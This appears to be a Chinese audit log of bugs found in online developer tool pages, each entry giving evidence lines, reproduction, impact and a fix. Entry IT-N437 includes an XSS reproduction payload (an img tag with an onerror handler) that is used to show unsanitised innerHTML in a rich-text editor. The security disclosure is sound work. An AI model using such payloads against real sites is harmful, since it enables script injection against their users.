- 问题：起始符写成 `'0000'`（四个空格，等于不画任何东西）；终止符写成 `'100'`（窄条-窄空-窄条），而 ISO/IEC 16390 要求起始 `1010`、终止 `11010`（宽条-窄空-窄条）。
- 证据：`tools/it/barcode-itf.html:253`（`let bits='0000'`）、`:264`（`bits+='100'`）。
- 复现：输入 `1234` 生成 PNG → 图像左端无起始 guard、右端是窄窄窄收尾；用扫码枪/手机扫描无法识读。node 侧按规范应为左 `1010` + 数据 + 右 `11010`。
- 影响：工具宣称「生成 ITF 条码」，实际产物不符合标准，任何扫描器都解不出，等同不可用。
- 方案：起始改为 `1010`、终止改为 `11010`；同时补宽窄比校验（当前 1:3 合法，但需在说明中固定）。

### IT-N325 画布文字、页面文字、复制内容三者不一致（中，确认缺陷）
- 问题：编码用 `text.replace(/\D/g,'')`（且奇数位前面补 `0`），画布底部却用未补零的数字串；`.bar-text` 与复制又用原始输入（含字母、未补零）。
- 证据：`tools/it/barcode-itf.html:292`（画布文案 = 去非数字、未补零）、`:294`（`.bar-text` = 原始 `text`）、`:299-300`（复制该文本）。
- 复现：输入 `ITF1234` → 条码实际编码 `1234`，画布显示 `1234`，页面下方与剪贴板显示 `ITF1234`；输入 `12345` → 实际编码前补 `0` 成 `012345`，画布仍显示 `12345`。期望三处统一为实际编码值（含补位）。
- 影响：人工核对/入库时以页面或复制文本为准，会与实际条码内容不符。
- 方案：把「补零后的规范化值」作为唯一真值，同时传给 `drawBarcode`、`.bar-text` 和复制逻辑。

### IT-N326 YAML 块标量 `|` / `>` 后的全部内容被丢弃（高，确认缺陷）
- 问题：`desc: |` 的 `val` 是 `'|'`，被当普通标量处理后 `p.i` 指向下一行；外层 `while` 只接受与当前 `indent` 相同的行，遇到缩进更深的块内容立即退出并返回，后续同级键全部丢失。
- 证据：`tools/it/yaml-to-json.html:256`（`while(...ind===indent)`）、`:262`（`|` 走 `yScalar`，未识别块标量）。
- 复现：输入 `desc: |` + 缩进两行的 `hello`、`world`，再接 `name: test` → 输出 `{"desc":"|"}`，`hello/world/name` 全部消失；期望 `{"desc":"hello\nworld\n","name":"test"}`。
- 影响：K8s/CI 配置里大量使用块标量，转换结果静默丢掉大段配置，且仍提示成功。
- 方案：识别 `|`/`>`（含 `|-`、`>-`）后按缩进收集连续行并按折叠规则拼接，再继续外层解析。

### IT-N327 YAML 行内注释未剥离，`8080 # note` 变成字符串（高，确认缺陷）
- 问题：`yScalar` 只对整行 `#` 开头的注释做跳过，行尾 `#` 原样保留在值里，类型判定随之中断。
- 证据：`tools/it/yaml-to-json.html:237`（仅跳过 `s[0]==='#'`）、`:232`（`return s` 原样返回）。
- 复现：`port: 8080  # 服务端口` → 输出 `{"port":"8080  # 服务端口"}`（字符串），期望 `{"port":8080}`。
- 影响：最常见 YAML 写法直接导致数值/布尔类型退化，下游按类型消费时出错。
- 方案：在引号外的第一个 `#`（前有空白）处截断再 trim；保留引号内的 `#`。

### IT-N328 JSON 空字符串转成 YAML `null`（高，确认缺陷）
- 问题：`toYaml('')` 返回空串，父级拼成 `k: `（冒号后无内容），YAML 语义为 null。
- 证据：`tools/it/json-to-yaml.html:273-276`（空串不进入任何加引号分支）、`:285`（`pad + k + ': ' + toYaml(...)`）。
- 复现：`{"k":""}` → 输出 `k: ` → 用任意 YAML 解析器读回为 `{k:null}`；期望 `k: ""`。
- 影响：空字符串与 null 是可区分的业务语义（如「显式清空」vs「未设置」），转换后丢失。
- 方案：`v===''` 时返回 `'""'`（与 `yNeedQ` 的 `v===''` 判定对齐）。

### IT-N329 「压缩转换」把每行 trim 掉缩进，层级结构被拍平（高，确认缺陷）
- 问题：`doMinYaml` 对 `toYaml` 结果逐行 `.trim()` 再 join，嵌套缩进全部消失，YAML 语义改变。
- 证据：`tools/it/json-to-yaml.html:301`（`split('\n').map(l => l.trim())`）。
- 复现：`{"a":{"b":1}}` → 正常输出 `a:\n  b: 1`；点「压缩转换」得到 `---\na:\nb: 1`，解析为 `{a:null,b:1}`；期望压缩只删空行、不改缩进。
- 影响：压缩结果与原文不等价，且页面仍提示「✅ 压缩转换」，用户拿去部署即出错。
- 方案：压缩仅过滤空白行与行尾空白（`replace(/\s+$/,'')`），保留前导空格。

### IT-N330 OTP 复制把「X 秒后刷新」一起写进剪贴板（中，确认缺陷）
- 问题：输出容器同时含验证码 `<div class="code-row">` 和倒计时文本，`copyResult` 取整个容器 `textContent`，两段无换行直接粘连。
- 证据：`tools/it/otp-generator.html:317`（code-row）、`:321`（timer 文本）、`:335-336`（`output.textContent` 写剪贴板）。
- 复现：TOTP 模式点「复制」→ 剪贴板为 `12345623 秒后刷新`（或 `123456`+`30 秒后刷新` 粘连），期望只有 6/8 位数字。
- 影响：粘贴进 2FA 输入框会多出非数字字符，验证直接失败；每秒刷新还会在整分边界换码，用户复制的可能是上一窗口的码。
- 方案：复制只取 `.code-row` 的文本；倒计时进度单独渲染并用 `aria-live`，不进入复制源。

### IT-N331 改维度后直接点「计算乘法」触发 null 解引用（中，确认缺陷）
- 问题：`getM` 按新维度拼 `id` 取输入框，但矩阵 DOM 只在点「构建矩阵」时重建；改 A 列数后未重建，读取不存在的 `a4/a5`。
- 证据：`tools/it/matrix-multiplier.html:283`（`document.getElementById(prefix+(i*cols+j)).value`）、`:305`（只校验 `ac!==br`，未校验 DOM 是否重建）。
- 复现：A 由 2×2 改为 2×3（只改「列」输入），不点「构建矩阵」直接点「计算乘法」→ `Cannot read properties of null (reading 'value')`，结果区无输出；期望自动重建或提示「请先构建矩阵」。
- 影响：输入维度与控件不同步时页面抛异常，用户看到按钮「没反应」。
- 方案：`calculate()` 开头先校验所需 `id` 是否存在（或比较维度与已建控件数量），不匹配则先 `build()`；`getM` 对 null 给出明确提示。

### IT-N332 文件 MD5 先 `TextDecoder` 解码再重编码，二进制文件结果必然错（高，确认缺陷）
- 问题：文件分支 `strData=null`，走 `md5(new TextDecoder().decode(bytes))`；UTF-8 解码会把二进制坏字节变成 U+FFFD，`md5()` 内部再按 UTF-16→UTF-8 编码，已无法还原原始字节。
- 证据：`tools/it/hash.html:548-563`（`strData` 为 null 时 `TextDecoder().decode(bytes)` 再 `md5(str)`）、`:459`（`utf8Encode` 逐 UTF-16 单元编码）。
- 复现：上传任意 PNG/JPG → 页面 MD5 与 `md5sum 文件` 不一致；上传含 emoji 的 UTF-8 文本文件同样不一致（emoji 字节 `f0 9f 98 80` 被重编码成 CESU-8 `ed a0 bd ed b8 80`）。期望对原始 `ArrayBuffer` 计算摘要。
- 影响：校验和工具的核心用途（比对下载文件完整性）完全失效，且结果看起来「像 MD5」，极具迷惑性。
- 方案：为字节数组实现独立 MD5（直接吃 `Uint8Array`，不做字符串编解码），文件分支不要走 `TextDecoder`。

### IT-N333 文本 MD5 对非 BMP 字符按 UTF-16 单元编码，结果与标准不符（高，确认缺陷）
- 问题：`utf8Encode` 对每个 `charCodeAt` 单独判断区间，遇到代理对（emoji、部分 CJK 扩展）会分别编成两个 3 字节序列（CESU-8），而标准 MD5 应按 UTF-8 4 字节编码。
- 证据：`tools/it/hash.html:459`（`for(n=0;n<string.length;n++){var c=string.charCodeAt(n);...}`）。
- 复现（node 实算）：输入 `😀` → 页面 `f99f51c2a9630a7f6b8c13c1818bc0c2`，标准 `md5("😀")` 为 `2a02eac39d716a70ecf37579185927b6`；页面实际编码字节 `ed a0 bd ed b8 80`，标准应为 `f0 9f 98 80`。
- 影响：含 emoji/生僻字的文本 MD5 与 `md5sum`、服务端校验全部不一致，用户会误以为文件被篡改。
- 方案：`utf8Encode` 先按码点处理代理对（`String.fromCodePoint` 口径），或直接用 `TextEncoder` 得到字节后对字节做 MD5。

## T 批 IT 第 1 轮覆盖（2026-11-04）
- 本轮审计 24 页：`pdf-signature-checker`、`emoji-meaning`、`octal-encode`、`random-string`、`xml-to-json`、`mongodb-cheatsheet`、`vector-dot-product`、`ulid-generator`、`calc-subnet`、`generator-16`、`http-methods`、`gamertag-generator`、`sql-cheatsheet`、`stopwatch`、`ecdsa`、`barcode-itf`、`yaml-to-json`、`json-to-yaml`、`xml-validator`、`uuid-v7-generator`、`otp-generator`、`matrix-multiplier`、`url-encoder-advanced`、`hash`（均为 `tools/it/<slug>.html`）。
- 新增 19 条（高 13 / 中 6），编号 IT-N315~IT-N333；上一批止于 IT-N314，本批无重号。
- 假工具候选 2 页：`pdf-signature-checker`（类型 C：宣称 PKCS#7/证书链验签，实为 ByteRange+Contents 存在性匹配）、`generator-16`（类型 A：仅按数量轮转固定 15 条硬编码 .env 键值，无随机生成）。
- 无高优、仅记录覆盖的页面：`emoji-meaning`、`mongodb-cheatsheet`、`vector-dot-product`、`ulid-generator`、`http-methods`、`sql-cheatsheet`、`stopwatch`、`ecdsa`、`xml-validator`、`uuid-v7-generator`、`url-encoder-advanced`（逐页读主流程与边界，未发现可复现的高优缺陷）。
- 数值核验：MD5/CRC32/Adler-32 与 RFC 4226/6238 测试向量、base32 解码、PDF 头字节偏移、ByteRange 差值均用 `node -e` 实算（`md5("abc")=900150983cd24fb0d6963f7d28e17f72`、`crc32("abc")=352441c2`、`adler32("abc")=024d0127`、`HOTP(c=0)=755224`、`TOTP(t=59,8位)=94287082`）。
- 未做浏览器/门禁/线上验证（未改工具页与构建产物、未跑 `_build.py`/`run_gates.py`、未做 git 写、未开浏览器）。

### IT-N334 Baudot 码表缺「8」，数字 8 被静默丢弃（高，确认缺陷）
- 问题：FIGS 码表缺少标准 ITA2 的 code 6 = `8`，编码时匹配不到任何表项即被跳过，且不提示。
- 证据：`tools/it/baudot-code.html:259`（`FIGS` 定义无 key 6）、`:274-292`（enc 未命中即 `continue` 丢弃）
- 复现：格式=二进制，输入 `8` → 实际输出空字符串，期望 `11011 00110`（FIGS 切换=27，8=6）；输入 `H8I` → 实际 `10100 00110`（8 消失且无 FIGS 切换），期望 `10100 11011 00110 11111 00110`（补 LTRS 回切=31）。
- 影响：含数字 8 的报文被静默改写，与真实 ITA2 设备互通时错码。
- 方案：补 `FIGS[6]='8'` 并按 ITA2 标准核对全表（含 code 5 的国别变体）；编码遇网格外字符时显式报错并列出被丢弃字符。




## T 批 IT 第 2 轮覆盖（2026-11-04）
- 本轮审计 24 页：`binary-encode`、`baudot-code`、`c-string-escape`、`xxencode`、`uuencode`、`quoted-printable`、`html-entity-encoder`、`html-escape`、`js-escape`、`java-escape`、`go-escape`、`php-escape`、`rust-escape`、`sql-escape`、`css-escape`、`python-escape`、`text-to-binary`、`text-to-decimal`、`text-to-hex`、`text-to-octal`、`rot-cipher`、`xor-cipher`、`polybius-cipher`、`json-to-tsv`（均为 `tools/it/<slug>.html`）。
- 新增 14 条（高 10 / 中 4），编号 IT-N334~IT-N347；第 1 轮止于 IT-N333，本批无重号。
- 假工具候选 0 页（24 页均有真实编码/转义/转换逻辑，未发现纯回显或静态壳）。
- 无高优、仅记录覆盖的页面：`binary-encode`、`quoted-printable`、`html-entity-encoder`、`js-escape`、`java-escape`、`sql-escape`、`css-escape`、`text-to-binary`、`text-to-decimal`、`rot-cipher`（逐页读主流程与边界，未发现可复现的高优缺陷）。
- 数值核验：C/Go/PHP/Python 转义、HTML 实体、CSS 跳过、hex/octal 前缀拼接、hex 解析均用 `node` 复刻原函数实算（`\101`→`101`、`\x4e2d`→`N2d`、`&#55357;`、`48\\x69`、`110\\145`、`parseFloat("12345678901234567890")=12345678901234567000`）。
- 未做浏览器/门禁/线上验证（未改工具页与构建产物、未跑 `_build.py`/`run_gates.py`、未做 git 写、未开浏览器）。

## T 批 IT 第 3 轮覆盖（2026-11-04）
- 本轮审计 8 页（均为 `tools/it/<slug>.html`）：`regex-visualizer`、`jwt-debugger`、`hash-identifier`、`json-repair`、`json-to-xml`、`yaml-to-xml`、`csv-to-yaml`、`toml-to-yaml`。
- 新增 18 条（高 8 / 中 10），编号 IT-N348~IT-N365；第 2 轮止于 IT-N347，本批无重号。
- 假工具候选 0 页：8 页均有真实转换/解析逻辑（JWT 生成器例外，见 IT-N349）。


### IT-N349 「生成 JWT」用 32 位滚动哈希冒充 HMAC，产出 token 无法验签（高，确认缺陷）
- 问题：`simpleHmac()` 只是 `hash=((hash<<5)-hash)+chr` 的 32 位滚动哈希，返回十进制字符串，再对该字符串做 base64url；既不是 HMAC-SHA256/384/512，也不是签名字节的 base64url。
- 证据：`tools/it/jwt-debugger.html:490-499`、`:479`（`base64UrlEncode(simpleHmac(sigInput, secret))`）
- 复现：alg=HS256、secret=`your-secret-key`、payload=`{"sub":"123"}` → 实际第三段是 `"123456789"` 之类十进制串的 base64url；用 node `crypto` 按 HS256 复算得到完全不同的签名，任何 JWT 库/服务端验签必失败；期望输出可通过标准验签的签名。
- 影响：页面标题承诺「生成JWT」，但生成的 token 100% 无效，接入联调必得 401，属假实现。
- 方案：改用 WebCrypto（`crypto.subtle.importKey('raw',…,{name:'HMAC',hash:'SHA-256'})` + `subtle.sign`），按 alg 映射 SHA-256/384/512，签名 ArrayBuffer 直接 base64url。



### 覆盖清单（T 批 IT 第 3 轮）
- `jwt-debugger`：IT-N349（高）。
- 方法声明：以上结论仅基于源码通读 + `node` 复刻页面原函数实算（json-repair / hash-identifier / yaml-to-xml / toml-to-yaml / csv-to-yaml / json-to-xml 的判定均给出「输入 → 实际 / 期望」），未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证；未修改任何工具页或构建产物。

## T 批 IT 第 4 轮覆盖（2026-11-04）

### IT-N366 长文本比较在每次按键都重建两张全尺寸 DP 矩阵，8000 字符即约 1.6GB（高，确认缺陷）
- 问题：`autoCalc()` 绑定在 `oninput`，每次输入都跑 `levenshtein()` 与 `computeDiff()`，两者各自分配 `(m+1)×(n+1)` 的二维数组，且 `levResult.matrix` 在 `computeDiff` 建表期间仍被持有。输入框无 `maxlength`、代码也无长度上限。
- 证据：`tools/it/text-similarity.html:189`、`:194`（`oninput="autoCalc()"`）、`:430-431`、`:497-517`（Levenshtein 全矩阵）、`:556-568`（LCS 全矩阵）、`:656`、`:725`
- 复现（node 复刻）：A/B 各 8000 字符 → 矩阵 64,016,001 格，单次 Levenshtein 810ms、峰值内存 819,633,824 B（约 782MB）；页面同时还要再建一张同规模 LCS 表，峰值约 1.5–1.6GB，且每个按键都重跑一遍；期望：对超过阈值（如 2000 字符）的输入提示「文本过长」并停止自动计算，或改用双行滚动 DP + Myers diff。
- 影响：粘贴两段长文本（代码 diff 是本工具典型用法）后逐字输入即长时间卡死；移动端/低内存设备直接 OOM 崩溃，结果区永远算不完。
- 方案：`levenshtein` 只保留两行滚动数组（回溯改为 ops 栈），`computeDiff` 用线性空间 Myers；同时在 `autoCalc` 前对 `max(lenA,lenB)` 设阈值（超限提示「文本过长」并停止计算），`oninput` 改防抖。




### 覆盖清单（T 批 IT 第 4 轮）
- `text-similarity`：IT-N366（高）。
- 方法声明：本轮仅基于上述 8 页源码通读 + `node` 在 `/tmp` 复刻页面原函数实算（每条均给出「输入 → 实际 / 期望」），**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。

## U 批 · IT 查询/编码表（2026-11-04）

### IT-N423 国家代码表仅 62 条，冰岛/卢森堡/柬埔寨等常见国家查不到（中，确认缺陷）
- 页面：`tools/it/country-code-lookup.html`
- 问题：`COUNTRIES` 仅收录 62 个 ISO 3166-1 alpha-2 条目（`:234-297`），而标准共 249 个；未命中即输出「❌ 未找到匹配的国家」（`:317-319`），也不支持 `UK`/`USA` 这类常见别名。
- 行号：`:234-297`、`:302-315`、`:317-319`
- 复现：输入 `IS` → 实际「❌ 未找到匹配的国家」；期望 Iceland / `+354` / ISK。实测 `LU`、`EE`、`SK`、`SI`、`KH`、`MM`、`NP` 均无条目；`UK`、`USA` 也查不到。
- 影响：作为「国家代码查询」工具覆盖面不足四分之一，常见查询直接失败。
- 假工具：否（数据缺口）

### 覆盖清单（U 批 IT 查询/编码表）
- `country-code-lookup`：IT-N423（中）；无高优缺陷（已收录条目的字段本身正确）。
- 方法声明：本轮仅通读上述 10 页源码 + `node` 在 `/tmp` 复刻页面原函数实算（每条均给出「输入 → 实际 / 期望」），**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。

## V 批 · IT 生成/校验/计算（2026-11-04）

### IT-N428 meta 生成器的 twitter:title / twitter:description 写死为本站文案，完全忽略用户输入（高，假功能）
- 页面：`tools/it/meta-tags-generator.html`
- 问题：`calcTool` 里 og:title / og:description 用的是用户输入 `t` / `d`（`:230-231`），但 twitter 卡两行直接拼了本工具自己的标题与简介常量（`:236-237`），与输入的 `t`、`d` 无关。原理说明还写着「社交：……以及 Twitter Card 的 twitter:card 等」（`:105`），暗示按输入生成。
- 行号：`:227-238`（核心 `:236`、`:237`）
- 复现：`title=我的站点`、`description=这是站点描述`、`url=https://example.com/` → 实际输出 `twitter:title="Meta 标签生成器 - 免费在线开发工具"`、`twitter:description="Meta 标签生成器是一款免费的在线IT 开发工具，……"`；期望 `twitter:title="我的站点"`、`twitter:description="这是站点描述"`。
- 影响：用户复制整段 meta 后，Twitter/X 分享卡片显示的是本工具的名字与简介，与其站点无关；且 twitter:description 里还有重复两遍的套话。
- 方案：改为 `'<meta name="twitter:title" content="'+t+'">'`、`…content="'+d+'">'`，与 og 两行同源。
- 假工具：否（核心输出错误）

### IT-N429 说明把 viewport 列为「必需」，生成结果却完全没有 viewport / charset / robots / keywords（中，承诺未实现）
- 页面：`tools/it/meta-tags-generator.html`
- 问题：原理框列出「基础」五项含 keywords、viewport、robots、charset（`:104`），并强调「viewport 是移动端正确适配的前提，缺失会触发桌面版缩放」（`:107`）；但 `calcTool` 只输出 `<title>`、`description`、`og:*`、`twitter:*`（`:228-238`），页面也没有这些字段的输入控件。
- 行号：`:104-107`（说法）、`:223-238`（实现）
- 复现：输入 `title=T`、`description=D`、`url=https://example.com/` → 实际输出 9 行，无 `<meta name="viewport">`、无 `<meta charset>`、无 `robots`、无 `keywords`；期望至少输出 `viewport`（或明确标注「不含 viewport」，由用户自加）。
- 影响：工具名叫「Meta 标签生成器」、说明也称「生成完整 meta 片段」，但用户把结果贴进 `<head>` 后移动端仍走桌面缩放，必须自己补标签。
- 假工具：否（功能缺口）

### IT-N430 用户输入里的双引号未转义，复制出的 meta 标签属性被提前闭合（中，确认缺陷）
- 页面：`tools/it/meta-tags-generator.html`
- 问题：`escH` 走 `div.textContent → innerHTML`（`:221`），HTML 文本节点序列化只转义 `& < >`，不转义 `"`；随后把整段字符串塞进 `<pre>` 展示（`:229-231` 的 `content="'+d+'"`）。用户据此复制粘贴得到的是原始双引号。同一行末的 `replace(/Infinity|NaN/g,'—')` 还会把用户文本里的 `NaN` / `Infinity` 字样改写为「—」。
- 行号：`:221`、`:228-234`、`:236-237`
- 复现：`description=He said "hi"` → 实际展示并可复制 `<meta name="description" content="He said "hi"">`，粘贴后属性在 `He said ` 处闭合，description 被截成 `He said `；期望 `content="He said &quot;hi&quot;"`。另：`title=NaN` → 实际显示 `—`。
- 影响：description/og/twitter 任一字段含引号（常见于引用型文案、含英寸/尺寸的文案）都会产出坏 HTML，页面本身不报错，难以发现。
- 方案：拼装时对字段单独做 `&quot;` 转义（或在 `escH` 里补 `"`/`'`），并把 NaN/Infinity 兜底只施加于数值结果、不施加到用户文本。
- 假工具：否

### IT-N431 CSS 压缩在引号字符串内照常删空白与 `: ; , > }`，合法 CSS 被静默改义（高，确认缺陷）
- 页面：`tools/it/css-minify.html`
- 问题：`minify` 是 4 条全局正则（`:216-221`），不区分字符串/`url()`：`\s*([{}:;,>])\s*`（`:219`）会把 `content:"a: b"` 里的 `:` 后空格删掉，`\s+/g→' '`（`:218`）把字符串内连续空格压成一个，`;\}`（`:220`）把字符串内的 `;}` 也删掉。页面却承诺「压缩仅去注释与空白，不改变选择器与声明语义」（`:168`），只是在 `:176` 含糊提了一句 content 特殊空格。
- 行号：`:216-221`（核心 `:218-220`）、`:168`、`:176`、`:224`
- 复现（node 复刻页内 `minify`，输入 → 实际）：
  - `.a::after{content:"a: b";}` → `.a::after{content:"a:b"}`（渲染文本由 `a: b` 变成 `a:b`）
  - `.a::after{content:"x; }";}` → `.a::after{content:"x}"}`（少了 `; `）
  - `.a::after{content:"A  B";}` → `.a::after{content:"A B"}`
  - `.a[title="a, b"]{color:red}` → `.a[title="a,b"]{color:red}`（属性选择器不再匹配原值）
  - 期望：字符串 / `url()` 内容原样保留，仅压缩字符串外空白。
- 影响：图标字、`content` 文案、属性选择器值会被改掉，且压缩结果看起来正常、只在上线后表现为文案或匹配错；对「压缩器」而言属输出错误而非样式问题。另 `:231` 的 `replace(/Infinity|NaN/g,'—')` 会把 CSS 里的 `.NaN` 选择器改写成 `.—`。
- 方案：先把 `"…"` / `'…'` / `url(…)` 用占位符替换，压缩完再还原（或写 tokenizer）；去掉对整段 HTML 的 NaN/Infinity 替换。
- 假工具：否

### IT-N432 短链页「复制」把「短链 + 原始 URL」拼在一起写入剪贴板（中，假功能）
- 页面：`tools/it/tiny-url.html`
- 问题：结果区同时渲染两行（`code-row` 短链、`原始 URL: …`，`:280`），`copyResult` 直接取 `#output` 的 `textContent`（`:295`）复制；两个 div 的文本没有分隔符，`textContent` 拼成 `短链原始 URL: 长链`。同时 `writeText(...).then(...)` 没有 `.catch`（`:296`），写入失败时静默无提示。
- 行号：`:280`、`:294-296`
- 复现：输入 `https://example.com/a?x=1`，生成后点「复制」→ 剪贴板实际内容 `https://tinyurl.com/AbC123原始 URL: https://example.com/a?x=1`；期望仅 `https://tinyurl.com/AbC123`。真机粘贴到聊天框即可复现。
- 影响：短链工具的核心动作产出不可直接使用的字符串，用户需手工截断；这也是该页唯一的「出站」路径。
- 方案：复制 `state` 里保存的短链（或单独 `#shortCode` 元素的文本），并对 `writeText` 补 `.catch` 提示。
- 假工具：否（页面已声明是「短链效果演示」，非真缩短服务）

### IT-N433 标准差的数据解析静默丢弃非数字项、并截断半数字符串，n 与结果随之失真（中，确认缺陷）
- 页面：`tools/it/standard-deviation.html`
- 问题：`parseData` 用 `parseFloat` + `isNaN` 过滤（`:256`），既不做整串校验也不报错：`abc` 之类整段被丢弃，`12abc` 被截成 `12`，`0x10` 被解析成 `0`；页面照常以「n=…」的确定口吻输出均值/方差/标准差。
- 行号：`:256`、`:258-262`、`:268`
- 复现（node 复刻页内 `parseData`/`calculate`）：
  - `1,2,3,abc` → 实际 `n=3`、`x̄=2`、`s=1`；期望提示「abc 不是有效数字」并拒绝计算（或明确列出被忽略项）。
  - `12abc, 3` → 实际按 `12, 3` 计算（s=6.364）；`0x10, 5` → 实际按 `0, 5` 计算（s=3.536）。
- 影响：从表格粘贴一列数据时，表头（如 `value`）会被无声吃掉，n 少 1、s 变化，而输出界面上没有任何异常信号，用户会误信结果。
- 方案：改用 `Number(s)` 并校验 `Number.isFinite`，非法 token 收集后提示；`12abc`、`0x10` 这类应报错而不是截断。
- 假工具：否

### IT-N434 CAA 生成器对域名不做任何校验，完整 URL / 含空格 / 大写域名都原样输出成「记录」（中，确认缺陷）
- 页面：`tools/it/caa-record-generator.html`
- 问题：`gen()` 只做 `trim()` 和去掉前导点（`:281`），随后直接把 `d` 拼进记录（`:297`），没有 hostname 合法性检查、没有小写归一、也不补结尾点；而 deep-dive 示例给的是带结尾点的 `example.com. CAA 0 issue "letsencrypt.org"`（`:181`），与输出格式不一致。
- 行号：`:281`、`:287-298`（核心 `:297`）、`:181`
- 复现：`domain=https://example.com`、勾选 Let's Encrypt → 实际输出 `https://example.com  CAA  0 issue "letsencrypt.org"`；期望拒绝并提示「请填写裸域名 example.com」。`domain=example com` → 输出 `example com  CAA …`；`Example.COM` → 保持大写不被归一。
- 影响：输出框被当作可直接粘贴的记录，非法 owner name 会被 DNS 服务商拒绝或写坏 zone；再者按 RFC 1035 主文件相对名规则，不带结尾点在 BIND zone 里会被拼上 `$ORIGIN`，指向错误的域名。
- 方案：`new URL`/正则校验 hostname（仅 `[a-z0-9.-]`、至少一个点、非 IP），统一小写，输出可选补 `.`。
- 假工具：否

### IT-N435 验证码「排除易混淆字符」在纯数字 / 纯字母模式下可见但代码未生效（中，承诺未实现）
- 页面：`tools/it/captcha-generator.html`
- 问题：`setType` 只在 `math`/`cn` 时隐藏该勾选框（`:921-924`），所以「纯数字」「纯字母」下勾选框仍然显示；但过滤逻辑只写在 `alnum` 分支（`:615-619`），`num` 分支死用 `0123456789`（`:588`），`alpha` 分支死用大小写字母表（`:596-604`），均未读 `state.excludeConfused`。默认预设「8个深色」还专门勾了这个选项（`:1081`）。
- 行号：`:344-346`、`:588-592`、`:596-604`、`:615-619`、`:921-924`、`:952-955`
- 复现：类型选「纯数字」+ 勾选「排除易混淆字符(0/O/o/I/l/1)」→ 实际仍生成如 `1010`、`0183`（含 0/1）；类型选「纯字母」+ 勾选 → 实际仍出现 `I`、`l`、`O`、`o`。期望结果中不含 `0OoIl1`。
- 影响：用户以为已规避易读错字符，实测仍出现，抄写验证码时按 0/O、1/l 混淆导致「验证失败」；对一个验证码示例工具而言等于选项无效。
- 方案：把过滤抽成公共函数对 `num`、`alpha`、`alnum` 的字符池统一应用（`num` 过滤后剩 8 位，需保证长度上限）。
- 假工具：否

### IT-N436 CSS 属性表把 `vertical-align` 登记了两条（不同分类、不同描述），统计与检索出现重复（中，确认缺陷）
- 页面：`tools/it/css-properties.html`
- 问题：`PROPERTIES` 里同名条目出现两次：`:379`（`cat:'文本'`，desc「垂直对齐」）与 `:454`（`cat:'表格'`，desc「表格垂直对齐」），其余字段仅 values 顺序不同。`renderProps` 不去重，`stats` 直接显示 `filtered.length`（`:493`）。
- 行号：`:379`、`:454`、`:482-493`（核心 `:493`）
- 复现：页面计数实际显示「共 133 个属性」（去重后为 132）；搜索框输入 `vertical-align` → 实际返回两张同名卡片，分别落在「文本」「表格」两个分类标签下，值为 `baseline, sub, super…` 与 `baseline, top, middle…`；期望只有一条，值表合并。
- 影响：属性总数与检索结果重复，且同一属性给出两套不同的取值顺序，用户会以为存在两个不同属性。
- 方案：删除 `:454` 那条（它落在「表格」分类，`vertical-align` 本就属文本/行内对齐），或在渲染前按 `name` 去重。
- 假工具：否

### 覆盖清单（V 批 IT 生成/校验/计算）
- `css-properties`：IT-N436（中）；无高优缺陷（属性值/初始值/继承性抽查未发现错误）。
- `meta-tags-generator`：IT-N428（高）、IT-N429、IT-N430（中）。
- `sqlite-cheatsheet`：无高优/中优缺陷（命令语法、`.mode`/JSON1/窗口函数示例与版本注记抽查正确；Chart/Table 双视图与检索联动正常）。
- `standard-deviation`：IT-N433（中）；无高优缺陷（sample/population 公式与 32/7≈4.57、s≈2.138 复算一致）。
- `tiny-url`：IT-N432（中）；无高优缺陷（随机短码生成与历史去重逻辑正常）。
- `css-minify`：IT-N431（高）。
- `caa-record-generator`：IT-N434（中）；无高优缺陷（CAA 记录语法、flag 128 关键位、iodef mailto 形式正确）。
- `captcha-generator`：IT-N435（中）；无高优缺陷（四种类型出题、数学答案校验、大小写归一逻辑正确）。
- 方法声明：本轮逐页通读上述 8 页源码，用 `node` 在 `/tmp` 复刻页面原函数实算（`minify`、`parseData/calculate`、`PROPERTIES` 去重）并给出「输入 → 实际 / 期望」；**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。IT-N430 的引号未转义依据 HTML 文本节点序列化规则判定（`& < >` 转义、引号不转义），未做真机粘贴验证；两处 `</div`（缺 `>`，`meta-tags-generator.html:124`、`css-minify.html:127`）会吞掉紧随的 `<div class="toolbar">` 开标签，属结构/布局问题，未计入本批条目。

## V 批 · IT 编辑器/安全/编码（2026-11-04）

### IT-N437 源码应用与 HTML 导入直接写 `innerHTML`，事件属性在页面源执行（高，安全缺陷）
- 页面：`tools/it/rich-text-editor.html`
- 问题：`applySource()` 把源码框原文直接赋给 contenteditable 的 `innerHTML`（`:424`）；`loadFile()` 把导入文件内容同样直接赋值（`:548`）。两条路径都没有标签/属性白名单，`<img src=x onerror=…>` 之类的内联事件会在本页源执行。页内说明却写着「粘贴内容必须净化，输出 HTML 前必须过滤，否则极易引入 XSS」（`:124`）、FAQ「通常做净化防止 XSS」（`:249`）、标准表「输出净化」（`:273`），实际一处净化都没有（全文无 sanitize/DOMPurify 实现）。另外 `showResult` 把导入文件名直接拼进 `innerHTML`（`:550`）。
- 行号：`:424`、`:548`、`:550`（说明 `:124`、`:249`、`:273`）
- 复现：源码框粘贴 `<img src="x" onerror="alert(document.domain)">` → 点「✓ 应用到编辑区」→ 实际弹窗显示当前域名（图片加载失败即触发）；期望 `onerror` 被剥除或作为纯文本插入。导入文件名为 `<img src=x onerror=…>.html` 时，`:550` 同样执行。
- 影响：任何下载来的 HTML 模板/他人给的 `.html` 文件，导入后即可在本站源执行任意脚本，读写本站 localStorage、改写页面；用户把该工具当"本地编辑"用，不会预期导入即执行脚本。
- 方案：赋值前用 DOMPurify（或白名单清洗）过滤 `script/iframe/on*`；文件名用 `textContent` 拼接。
- 假工具：否

### IT-N438 有序列表导出 Markdown 时编号丢失，全部变成无序列表（中，功能缺口）
- 页面：`tools/it/rich-text-editor.html`
- 问题：`walk()` 对 `li` 一律输出 `'\n- '`（`:479`），`ul`/`ol` 只做内容透传（`:480`），不区分父标签、也不读 `start`/序号；公式 :119 虽写明"li 前加 `- `"，但结果是把有序列表的编号语义抹掉。
- 行号：`:479-480`
- 复现：编辑区写有序列表「1. 第一步 / 2. 第二步」→ 点「复制 Markdown」→ 实际 `- 第一步\n- 第二步`；期望 `1. 第一步\n2. 第二步`。
- 影响：粘贴到文档/README 后步骤编号消失，顺序语义丢失；页面 :291 只说"近似转换"，未提示有序列表会被降级。
